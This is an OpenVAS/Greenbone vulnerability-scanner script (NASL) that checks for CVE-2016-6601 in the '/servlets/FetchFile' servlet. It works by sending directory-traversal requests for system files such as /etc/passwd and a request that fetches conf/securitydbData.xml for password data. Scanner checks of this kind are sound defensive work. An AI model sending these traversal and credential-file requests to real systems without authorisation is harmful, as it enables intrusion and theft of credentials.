if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105858" );
	script_version( "2021-09-20T09:01:50+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2016-6601" );
	script_name( "Multiple Vendors '/servlets/FetchFile' Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "https://blogs.securiteam.com/index.php/archives/2712" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40229/" );
	script_tag( name: "vuldetect", value: "Try to read files like /etc/passwd or conf/securitydbData.xml." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "Multiple vulnerabilities affecting the remote device have been found, these vulnerabilities allows uploading of arbitrary files and their
  execution, arbitrary file download (with directory traversal), use of a weak algorithm for storing passwords and session hijacking." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-09-20 09:01:50 +0000 (Mon, 20 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2018-10-09 20:00:00 +0000 (Tue, 09 Oct 2018)" );
	script_tag( name: "creation_date", value: "2016-08-09 10:38:38 +0200 (Tue, 09 Aug 2016)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 9090 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 9090 );
files = traversal_files();
for file in keys( files ) {
	url = "/servlets/FetchFile?fileName=../../../../../../../" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
url = "/servlets/FetchFile?fileName=conf/securitydbData.xml";
if(http_vuln_check( port: port, url: url, pattern: "<AUTHORIZATION-DATA>", extra_check: make_list( "<DATA ownername=",
	 "password=" ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

